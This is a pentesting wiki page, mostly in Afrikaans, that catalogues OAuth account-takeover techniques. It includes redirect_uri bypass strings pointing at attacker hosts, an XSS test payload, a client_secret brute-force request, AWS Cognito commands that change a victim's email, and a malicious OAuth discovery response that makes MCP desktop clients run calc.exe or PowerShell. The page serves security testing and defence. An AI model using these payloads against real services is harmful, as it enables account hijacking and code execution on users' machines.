# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting <a href="#d4a8" id="d4a8"></a>

OAuth bied verskeie weergawes, met basiese insigte beskikbaar by [OAuth 2.0 documentation](https://oauth.net/2/). Hierdie bespreking fokus hoofsaaklik op die algemeen gebruikte [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), wat 'n **authorisasieraamwerk bied wat 'n toepassing in staat stel om toegang te kry tot of aksies uit te voer op 'n gebruiker se rekening in 'n ander toepassing** (the authorization server).

Oorweeg 'n hipotetiese webwerf _**https://example.com**_, ontwerp om **al jou sosiale media-plasings te vertoon**, insluitend private plasings. Om dit te bereik word OAuth 2.0 gebruik. _https://example.com_ sal jou toestemming vra om **toegang tot jou sosiale media-plasings** te kry. Gevolglik sal 'n toestemmingskerm op _https://socialmedia.com_ verskyn wat die **toestemmings wat versoek word en die ontwikkelaar wat die versoek doen** uiteensit. Na jou magtiging kry _https://example.com_ die vermoë om **jou plasings namens jou te benader**.

Dit is noodsaaklik om die volgende komponente binne die OAuth 2.0-raamwerk te verstaan:

- **resource owner**: Jy, as die **gebruiker/entiteit**, magtig toegang tot jou hulpbron, soos jou sosiale media-rekening se plasings.
- **resource server**: Die **bediener wat geverifieerde versoeke hanteer** nadat die toepassing 'n `access token` namens die `resource owner` verkry het, bv. **https://socialmedia.com**.
- **client application**: Die **toepassing wat magtiging soek** by die `resource owner`, soos **https://example.com**.
- **authorization server**: Die **bediener wat `access tokens` uitreik** aan die `client application` na die suksesvolle verifikasie van die `resource owner` en die verkryging van magtiging, bv. **https://socialmedia.com**.
- **client_id**: 'n openbare, unieke identifiseerder vir die toepassing.
- **client_secret:** 'n vertroulike sleutel, slegs bekend aan die toepassing en die authorization server, gebruik om `access_tokens` te genereer.
- **response_type**: 'n waarde wat aandui **die tipe token wat versoek word**, soos `code`.
- **scope**: Die **vlak van toegang** wat die `client application` van die `resource owner` aanvra.
- **redirect_uri**: Die **URL waarheen die gebruiker ná magtiging herlei word**. Dit moet tipies ooreenstem met die vooraf-geregistreerde redirect URL.
- **state**: 'n parameter om **data te behou tydens die gebruiker se herleiding na en van die authorization server**. Die uniekheid daarvan is krities om as 'n **CSRF-beskermingsmeganisme** te dien.
- **grant_type**: 'n parameter wat aandui **die grant type en die tipe token wat teruggegee sal word**.
- **code**: Die authorization code van die `authorization server`, gebruik saam met `client_id` en `client_secret` deur die client application om 'n `access_token` te bekom.
- **access_token**: Die **token wat die client application gebruik vir API-versoeke** namens die `resource owner`.
- **refresh_token**: Stel die toepassing in staat om 'n nuwe `access_token` te bekom sonder om die gebruiker weer te vra.

### Vloei

Die **werklike OAuth-vloei** verloop soos volg:

1. Jy navigeer na [https://example.com](https://example.com) en kies die “Integreer met Sosiale Media” knoppie.
2. Die site stuur dan 'n versoek na [https://socialmedia.com](https://socialmedia.com) en vra jou magtiging om https://example.com se toepassing toegang tot jou plasings te gee. Die versoek is gestruktureer soos:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Daarna word jou ’n toestemmingsbladsy aangebied.
4. Na jou goedkeuring stuur Social Media ’n respons na die `redirect_uri` met die `code` en `state` parameters:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com gebruik hierdie `code`, saam met sy `client_id` en `client_secret`, om 'n server-side versoek te maak om 'n `access_token` namens jou te verkry, wat toegang tot die toestemmings waartoe jy ingestem het moontlik maak:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, die proses eindig wanneer https://example.com jou `access_token` gebruik om ’n API-oproep na Sosiale Media te maak om toegang te kry

## Kwetsbaarhede <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), die authorization server moet die blaaier slegs na vooraf-geregistreerde, presiese redirect URIs herlei. Enige swakheid hier laat ’n aanvaller toe om ’n slagoffer deur ’n kwaadwillige authorization URL te stuur sodat die IdP die slagoffer se `code` (en `state`) reguit na ’n aanvallers-endpunt lewer, wat dit dan kan inlos en tokens oes.

Tipiese aanval-werkvloei:

1. Skep `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` en stuur dit na die slagoffer.
2. Die slagoffer verifieer en keur die scopes goed.
3. Die IdP herlei na `attacker.tld/callback?code=<victim-code>&state=...` waar die aanvaller die versoek loods en onmiddellik die code inruil.

Algemene validasie-foute om te ondersoek:

- **Geen validasie** – enige absolute URL word aanvaar, wat tot onmiddellike kode-diefstal lei.
- **Swakker substring/regex kontrole op die host** – omseil met lookalikes soos `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, of `match.com@evil.com`.
- **IDN homograph mismatches** – validasie gebeur op die punycode-vorm (`xn--`), maar die blaaier herlei na die Unicode-domein wat deur die aanvaller beheer word.
- **Arbitrêre paaie op ’n toegelate host** – wys `redirect_uri` na `/openredirect?next=https://attacker.tld` of enige XSS/user-content endpunt sodat die code deur geketende herleidings, Referer-opskrifte, of ingespuitde JavaScript gelek word.
- **Directory-beperkings sonder normalisering** – patrone soos `/oauth/*` kan omseil word met `/oauth/../anything`.
- **Wildcard subdomeine** – die aanvaar van `*.example.com` beteken enige takeover (dangling DNS, S3 bucket, ens.) lewer onmiddellik ’n geldige callback.
- **Nie-HTTPS callbacks** – die deurlaat van `http://` URIs gee netwerk-aanvallers (Wi‑Fi, korporatiewe proxy) die geleentheid om die code in transito te gryp.

Hersien ook bykomende redirect-styl parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, ens.) en die OpenID discovery document (`/.well-known/openid-configuration`) vir addisionele endpunte wat moontlik dieselfde validasie-foute erf.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Soos in hierdie bug bounty-verslag [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) genoem, kan dit moontlik wees dat die redirect **URL in die response** van die bediener weerspieël word nadat die gebruiker geverifieer het, en dus **vatbaar vir XSS**. Moontlike payload om te toets:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Onvoldoende hantering van die state-parameter <a href="#bda5" id="bda5"></a>

Die `state` parameter is die Authorization Code flow CSRF-token: die client moet 'n **kriptografies ewekansige waarde per blaaierinstansie** genereer, dit op 'n plek stoor wat slegs daardie blaaier kan lees (cookie, local storage, ens.), dit in die authorization request stuur, en enige response verwerp wat nie dieselfde waarde teruggee nie. Wanneer die waarde staties, voorspelbaar, opsioneel of nie aan die gebruiker se sessie gekoppel is nie, kan die aanvaller hul eie OAuth-flow voltooi, die finale `?code=` versoek onderskep (sonder om dit te stuur), en later 'n slagoffer-blaaier dwing om daardie versoek te hergebruik sodat die slagofferrekening aan die aanvaller se identity provider-profiel verbind word.

Die replay-patroon is altyd dieselfde:

1. Die aanvaller autentiseer teen die IdP met hul rekening en onderskep die laaste redirect wat die `code` (en enige `state`) bevat.
2. Hulle laat daardie versoek val, hou die URL, en misbruik later enige CSRF-primitive (skakel, iframe, outo-insendende vorm) om die slagoffer-blaaier te dwing om dit te laai.
3. As die client `state` nie afdwing nie, verbruik die toepassing die aanvaller se authorisation-resultaat en teken die aanvaller in op die slagoffer se app-rekening.

'n Praktiese kontrolelys vir `state` hantering tydens toetse:

- **Missing `state` entirely** – as die parameter nooit verskyn nie, is die hele aanmelding CSRFable.
- **`state` not required** – verwyder dit uit die aanvanklike versoek; as die IdP steeds kodes uitreik wat die client aanvaar, is die verdediging opt-in.
- **Returned `state` not validated** – manipuleer die waarde in die response (Burp, MITM proxy). Aanvaarding van ongelyke waardes beteken die gestoor token word nooit vergelyk nie.
- **Predictable or purely data-driven `state`** – baie apps pak redirect-paaie of JSON blobs in `state` sonder om ewekansigheid te meng, wat aanvallers toelaat om geldige waardes te raai en flows te hergebruik. Voeg altyd sterk entropie voor of na die enkodering van data.
- **`state` fixation** – as die app gebruikers toelaat om die `state` waarde te verskaf (bv. via gemanipuleerde authorization URLs) en dit deur die hele flow hergebruik, kan 'n aanvaller 'n bekende waarde vaspen en dit oor slagoffers hergebruik.

PKCE kan `state` aanvul (veral vir public clients) deur die authorization code aan 'n code verifier te bind, maar web clients moet steeds `state` volg om cross-user CSRF/account-linking foute te voorkom.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Aanvallers kan vooraf 'n rekening skep met die slagoffer se e-pos. As die slagoffer later 'n third-party-diens gebruik vir aanmelding, kan die toepassing per ongeluk daardie third-party-rekening koppel aan die aanvaller se vooraf geskepte rekening, wat tot ongemagtigde toegang lei.
2. **Exploiting Lax OAuth Email Verification**: Aanvallers kan OAuth-dienste uitbuit wat e-posse nie verifieer nie deur 'n rekening te registreer en dan die rekening-e-pos na die slagoffer se e-pos te verander. Hierdie metode loop soortgelyke risiko vir ongemagtigde rekeningtoegang, soortgelyk aan die eerste scenario maar deur 'n ander aanvalsvector.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Die `client_id` is opsetlik publiek, maar die **`client_secret` must never be recoverable by end users**. Authorization Code deployments wat die secret in **mobile APKs, desktop clients, or single-page apps** inbou, gee daardie credential effektief aan enigiemand wat die pakket kan aflaai. Inspekteer publieke clients altyd deur:

- Die APK/IPA, desktop installer, of Electron app uit te pak en te grep vir `client_secret`, Base64 blobs wat na JSON dekodeer, of hard-coded OAuth endpoints.
- Gebundelde config-lêers (plist, JSON, XML) of gedekompileerde strings vir client credentials te hersien.

Sodra die aanvaller die secret onttrek, hoef hulle net enige slagoffer se authorisation `code` te steel (via 'n swak `redirect_uri`, logs, ens.) om onafhanklik `/token` te tref en toegang-/refresh-tokens te mint sonder om die legitime app te betrek. Behandel publieke/native clients as **incapable of holding secrets**—hulle moet eerder op PKCE (RFC 7636) staatmaak om die besit van 'n per-instansie code verifier te bewys in plaas van 'n statiese secret. Tydens toetsing, bevestig of PKCE verpligtend is en of die backend werklik token-wisselings wat óf die `client_secret` **or** 'n geldige `code_verifier` weglate, verwerp.

### Client Secret Bruteforce

Jy kan probeer om die **bruteforce the `client_secret`** van 'n service provider by die identity provider om rekeninge te probeer steel.  
Die versoek om te BF kan soortgelyk lyk:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Sodra die kliënt die **code and state** het, as hulle in **`location.href`** of **`document.referrer`** sigbaar word en aan derde partye oorgedra word, leak hulle. Twee herhalende patrone:

- **Classic Referer leak**: na die OAuth redirect, enige navigasie wat `?code=&state=` in die URL behou sal dit in die **Referer** header druk wat aan CDNs/analytics/ads gestuur word.
- **Telemetry/analytics confused deputy**: sommige SDKs (pixels/JS loggers) reageer op `postMessage`-events en dan **stuur die huidige `location.href`/`referrer` na backend APIs met ’n token wat in die boodskap verskaf is**. As jy jou eie token in daardie stroom kan inprop (bv. via ’n attacker-controlled postMessage relay), kan jy later die SDK’s API-versoekgeskiedenis/logs lees en die slagoffer se OAuth artifacts herstel wat in daardie versoeke ingesluit is.

### Access Token Stored in Browser History

Die kernwaarborg van die Authorization Code grant is dat **access tokens nooit die resource owner se blaaier bereik nie**. Wanneer implementasies tokens client-side leaken, word enige klein fout (XSS, Referer leak, proxy logging) ’n onmiddellike rekeningkompromie. Kontroleer altyd vir:

- **Tokens in URLs** – as `access_token` in die query/fragment verskyn, beland dit in blaaiergeskiedenis, server logs, analytics, en Referer headers wat aan derde partye gestuur word.
- **Tokens transiting untrusted middleboxes** – terugstuur van tokens oor HTTP of deur debugging/corporate proxies laat netwerkwaarnemers dit direk vasvang.
- **Tokens stored in JavaScript state** – React/Vue stores, globale veranderlikes, of geserialiseerde JSON-blobs maak tokens sigbaar vir elke script op die origin (insluitend XSS payloads of kwaadwillige extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` behou tokens lank na logout op gedeelde toestelle en is deur scripts toeganklik.

Enige van hierdie bevindings skaal gewoonlik andersins “laag” foute (soos ’n CSP bypass of DOM XSS) op na ’n volle API takeover omdat die aanvaller eenvoudig die gelekte bearer token kan lees en hergebruik.

### Everlasting Authorization Code

Authorization codes moet kortstondig, eenmalig en replay-aware wees. Wanneer jy ’n flow evalueer, vang ’n `code` en:

- **Test the lifetime** – RFC 6749 beveel minute aan, nie ure nie. Probeer die code na 5–10 minute inruil; as dit nog werk, is die blootstellingsvenster vir enige gelekte code buitensporig.
- **Test sequential reuse** – stuur dieselfde `code` twee keer. As die tweede versoek nog ’n token gee, kan aanvallers sessies onbeperk kloon.
- **Test concurrent redemption/race conditions** – stuur twee token-versoeke parallel (Burp intruder, turbo intruder). Swak issuers gee soms albei.
- **Observe replay handling** – ’n hergebruikpoging moet nie net misluk nie, maar ook enige tokens wat reeds uit daardie code gemunt is intrek. Andersins laat ’n ontdekte replay die aanvaller se eerste token aktief.

Om ’n replay-vriendelike code te kombineer met enige `redirect_uri` of logging-bug maak volgehoue rekeningtoegang moontlik selfs nadat die slagoffer die wettige aanmelding voltooi het.

### Authorization/Refresh Token not bound to client

As jy die **authorization code** kan kry en dit **vir ’n ander client/app kan inruil**, kan jy ander rekeninge oorneem. Toets vir swak binding deur:

- Vasvang van ’n `code` vir **app A** en dit aan **app B’s token endpoint** stuur; as jy steeds ’n token ontvang, is audience binding gebreek.
- Probeer first-party token minting endpoints wat tot hul eie client IDs beperk behoort te wees; as hulle arbitrêre `state`/`app_id` aanvaar terwyl hulle slegs die code valideer, voer jy effektief ’n **authorization-code swap** uit om hoër-privilege first-party tokens te mint.
- Kontroleer of client binding nonce/redirect URI ongelykhede ignoreer. As ’n foutbladsy steeds SDKs laai wat `location.href` log, kombineer dit met Referer/telemetry leaks om codes te steel en elders in te ruil.

Enige endpoint wat `code` → token ruil **moet** die uitreikende client, redirect URI en nonce verifieer; anders kan ’n gesteelde code van enige app opgradeer na ’n first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In hierdie bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) kan jy sien dat die **token** wat **AWS Cognito** aan die gebruiker teruggee dalk **genoeg permissies het om die gebruikersdata oor te skryf**. Daarom, as jy die **user email vir ’n ander user email kan verander**, mag jy ander rekeninge kan **take over**.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more gedetaileerde inligting oor hoe om AWS Cognito te misbruik kyk [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Soos [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows wat verwag om die **token** (en nie 'n code nie) te ontvang, kan kwesbaar wees as hulle nie kontroleer dat die token aan die app behoort nie.

Dit is omdat 'n **attacker** 'n **application supporting OAuth and login with Facebook** (byvoorbeeld) in sy eie toepassing kan skep. Daarna, sodra 'n **victim** met Facebook in die **attackers application** aanmeld, kan die attacker die **OAuth token of the user given to his application** kry en dit gebruik om by die victim OAuth application in te teken met die victim se user token.

> [!CAUTION]
> Daarom, as die attacker daarin slaag om die user te kry om toegang tot sy eie OAuth application te gee, sal hy die victims rekening in applications wat 'n token verwag en nie kontroleer of die token aan hul app ID toegeken is nie, kan oorneem.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Volgens [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), was dit moontlik om 'n victim te laat 'n bladsy oopmaak met 'n **returnUrl** wat na die attackers host wys. Hierdie inligting sou in 'n **cookie (RU)** gestoor word en in 'n **later stap** sal die **prompt** die **user** vra of hy toegang aan daardie attackers host wil gee.

Om hierdie prompt te omseil, was dit moontlik om 'n oortjie te open om die **Oauth flow** te begin wat hierdie RU cookie met die **returnUrl** sou stel, die oortjie te sluit voordat die prompt vertoon word, en 'n nuwe oortjie te open sonder daardie waarde. Dan sal die **prompt nie oor die attackers host inlig nie**, maar die cookie sal daarop gestel wees, sodat die **token na die attackers host** in die omleiding gestuur sal word.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Soos verduidelik in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), laat sommige OAuth-implementasies toe om die **`prompt`** GET-parameter as None (**`&prompt=none`**) aan te dui om te voorkom dat users op die web gevra word om die gegewe toegang te bevestig indien hulle reeds by die platform aangemeld is.

### response_mode

Soos [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), kan dit moontlik wees om die parameter **`response_mode`** aan te dui om te bepaal waar die code in die finale URL verskaf word:

- `response_mode=query` -> Die code word binne 'n GET-parameter verskaf: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Die code word binne die URL fragment verskaf `#code=2397rf3gu93f`
- `response_mode=form_post` -> Die code word binne 'n POST-formulier verskaf met 'n input genaamd `code` en die waarde
- `response_mode=web_message` -> Die code word in 'n post-berig gestuur: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login-dialoge is ideale clickjacking-teikens: as hulle ingekader kan word, kan 'n attacker eie grafika oorleë, die regte knoppies verberg en users mislei om gevaarlike scopes te keur of rekeninge te koppel. Bou PoCs wat:

1. Laai die IdP authorization URL binne 'n `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Gebruik absolute positioning/opacity-truuks om valse knoppies met die versteekte **Allow**/**Approve** kontroles te belyn.
3. Opsioneel vorinvul parameters (scopes, redirect URI) sodat die gesteelde goedkeuring onmiddellik die attacker bevoordeel.

Tydens toetsing verifieer dat IdP-bladsye óf `X-Frame-Options: DENY/SAMEORIGIN` óf 'n beperkende `Content-Security-Policy: frame-ancestors 'none'` uitstuur. As geen van beide teenwoordig is nie, demonstreer die risiko met gereedskap soos [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) en neem op hoe maklik 'n victim die attacker's app magtig. Vir addisionele payload-idees sien [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Volgens [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), is dit 'n OAuth-flow wat toelaat om via **username** en **password** by OAuth aan te meld. As tydens hierdie eenvoudige flow 'n **token** teruggestuur word met toegang tot al die aksies wat die user kan uitvoer, is dit moontlik om 2FA te omseil deur daardie token te gebruik.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Hierdie [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) beskryf hoe dit moontlik was om 'n **open redirect** te misbruik gebaseer op die waarde van die **referrer** om OAuth tot ATO te misbruik. Die aanval was:

1. Die victim besoek die attackers webblad.
2. Die victim open die kwaadwillige skakel en 'n opener begin die Google OAuth flow met `response_type=id_token,code&prompt=none` as bykomende parameters, en gebruik die attackers webwerf as **referrer**.
3. In die opener, nadat die provider die victim magtig, stuur dit hulle terug na die waarde van die `redirect_uri` parameter (victim web) met 'n 30X-kode wat steeds die attackers webwerf in die referer behou.
4. Die victim se **website trigger die open redirect gebaseer op die referrer** en herlei die victim na die attackers webwerf. Aangesien die **`respose_type`** **`id_token,code`** was, sal die code in die **fragment** van die URL aan die attacker teruggestuur word, wat hom toelaat om die gebruiker se rekening via Google op die victim se site oor te neem.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth dien as 'n minder voor die hand liggende maar kritieke vektor vir sekuriteitskwessies, spesifiek vir **Server-Side Request Forgery (SSRF)**-aanvalle. Hierdie endpoint laat OAuth-servers toe om besonderhede oor client applications te ontvang, insluitend sensitiewe URLs wat misbruik kan word.

Key Points:

- **Dynamic Client Registration** is dikwels gemapped na `/register` en aanvaar besonderhede soos `client_name`, `client_secret`, `redirect_uris`, en URLs vir logos of JSON Web Key Sets (JWKs) via POST-versoeke.
- Hierdie funksie volg die spesifikasies in **RFC7591** en **OpenID Connect Registration 1.0**, wat parameters insluit wat potensieel vir SSRF kwesbaar is.
- Die registrasieproses kan servers op verskeie maniere aan SSRF blootstel:
- **`logo_uri`**: 'n URL vir die client application se logo wat deur die server gevra kan word, wat SSRF kan veroorsaak of tot XSS lei indien die URL verkeerd hanteer word.
- **`jwks_uri`**: 'n URL na die client se JWK-dokument wat, indien kwaadwillig opgestel, die server kan laat uitgaande versoeke maak na 'n attacker-controlled server.
- **`sector_identifier_uri`**: Verwys na 'n JSON-array van `redirect_uris`, wat die server moontlik sal haal en sodoende 'n SSRF-geleentheid skep.
- **`request_uris`**: Lys van toegelate request URIs vir die client, wat misbruik kan word as die server hierdie URIs by die begin van die autorisasieproses haal.

Exploitation Strategy:

- SSRF kan veroorsaak word deur 'n nuwe client te registreer met kwaadwillige URLs in parameters soos `logo_uri`, `jwks_uri`, of `sector_identifier_uri`.
- Alhoewel direkte uitbuiting via `request_uris` deur whitelist-beheer gereguleer kan word, kan die voorsiening van 'n vooraf-geregistreerde, attacker-controlled `request_uri` SSRF fasiliteer tydens die autorisasiefase.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Navorsing oor [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (wat `mcp-remote` clients soos Claude Desktop, Cursor of Windsurf raak) wys hoe **dynamic OAuth discovery 'n RCE-primitive word** wanneer die client IdP-metadata direk aan die operating system deurgee. Die remote MCP-server stuur 'n attacker-controlled `authorization_endpoint` tydens die discovery-ruil (`/.well-known/openid-configuration` of enige metadata RPC). `mcp-remote ≤0.1.15` sou dan die system URL handler (`start`, `open`, `xdg-open`, ens.) aanroep met watter string ook al ontvang is, sodat enige scheme/path wat deur die OS ondersteun word, lokaal uitgevoer word.

Attack workflow

1. Wys die desktop agent na 'n hostile MCP/OAuth server (`npx mcp-remote https://evil`). Die agent ontvang 'n 401 plus metadata.
2. Die server antwoord met JSON soos:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Die kliënt start die OS-hanteraar vir die verskafde URI. Windows aanvaar payloads soos `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux aanvaar `file:///Applications/Calculator.app/...` of selfs pasgemaakte skemas soos `cmd://bash -lc '<payload>'` indien geregistreer.
4. Omdat dit gebeur voordat enige gebruikerinteraksie plaasvind, lei **slegs die konfigurasie van die kliënt om met die aanvallerserver te praat tot code-uitvoering**.

**Hoe om te toets**

- Teiken enige OAuth-ondersteunde desktop/agent wat discovery oor HTTP(S) doen en teruggewerkte endpoints plaaslik oopmaak (Electron apps, CLI helpers, thick clients).
- Intersepteer of host die discovery response en vervang `authorization_endpoint`, `device_authorization_endpoint`, of soortgelyke velde met `file://`, `cmd://`, UNC paths, of ander gevaarlike skemas.
- Kyk of die kliënt die scheme/host valideer. Gebrek aan validasie lei tot onmiddellike uitvoering onder die gebruiker-konteks en bewys die probleem.
- Herhaal met verskillende skemas om die volledige aanvalsvlak te karteer (bv. `ms-excel:`, `data:text/html,`, custom protocol handlers) en demonstreer cross-platform bereik.

## OAuth-verskaffers Wedlooptoestande

As die platform wat jy toets 'n OAuth-verskaffer is [**lees dit om te toets vir moontlike Wedlooptoestande**](race-condition.md).

## Mutable Claims Attack

In OAuth identifiseer die sub-veld uniek 'n gebruiker, maar die formaat wissel per Authorization Server. Om gebruikersidentifikasie te standaardiseer, gebruik sommige kliënte e-posadresse of gebruikershandvatsels. Dit is egter riskant omdat:

- Sommige Authorization Servers verseker nie dat hierdie eienskappe (soos email) onveranderlik bly nie.
- In sekere implementasies—soos **"Login with Microsoft"**—vertrou die kliënt op die email-veld, wat **deur die gebruiker in Entra ID beheer word** en nie geverifieer is nie.
- 'n Aanvaller kan dit misbruik deur hul eie Azure AD-organisasie te skep (bv. doyensectestorg) en dit te gebruik om 'n Microsoft login uit te voer.
- Al is die Object ID (gestoor in sub) onveranderlik en veilig, kan die vertroue op 'n veranderlike email-veld 'n account takeover moontlik maak (byvoorbeeld die kaping van 'n rekening soos victim@gmail.com).

## Client Confusion Attack

In 'n Client Confusion Attack versuim 'n toepassing wat die OAuth Implicit Flow gebruik om te verifieer dat die finale access token spesifiek vir sy eie Client ID gegenereer is. 'n Aanvaller stel 'n openbare webwerf op wat Google’s OAuth Implicit Flow gebruik en mislei duisende gebruikers om aan te meld, en so access tokens te oes wat bedoel is vir die aanvallers se webwerf. As daardie gebruikers ook rekeninge het op 'n ander kwesbare webwerf wat nie die token se Client ID valideer nie, kan die aanvaller die geoogste tokens hergebruik om die slagoffers te imiteer en hul rekeninge oor te neem.

## Scope Upgrade Attack

Die **Authorization Code Grant** tipe behels veilige server-tot-server-kommunikasie vir die oordrag van gebruikersdata. As die **Authorization Server** egter implisiet 'n scope-parameter in die Access Token Request vertrou (’n parameter wat nie in die RFC gedefinieer is nie), kan 'n kwaadwillige toepassing die privilegies van 'n authorization code opgradeer deur 'n hoër scope te versoek. Nadat die **Access Token** gegenereer is, moet die **Resource Server** dit verifieer: vir JWT-tokens behels dit die kontrole van die JWT-handtekening en die onttrekking van data soos client_id en scope, terwyl vir random string tokens die bediener die Authorization Server moet bevraag om die token se besonderhede te kry.

## Redirect Scheme Hijacking

In mobiele OAuth-implementasies gebruik apps **custom URI schemes** om redirects met Authorization Codes te ontvang. Omdat meerdere apps egter dieselfde scheme op 'n toestel kan registreer, word die veronderstelling dat slegs die wettige kliënt die redirect URI beheer, gebreek. Op Android, byvoorbeeld, word 'n Intent URI soos `com.example.app://` op grond van die scheme en opsionele filters in 'n app se intent-filter gevang. Omdat Android se intent-resolusie wyd kan wees—veral as slegs die scheme gespesifiseer is—kan 'n aanvaller 'n kwaadwillige app registreer met 'n sorgvuldig saamgestelde intent filter om die authorization code te kaap. Dit kan 'n account takeover moontlik maak, hetsy deur gebruikerinteraksie (wanneer meerdere apps geskik is om die intent te hanteer) of via omseilings wat te spesifieke filters uitbuit, soos gedetailleer deur Ostorlab se assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
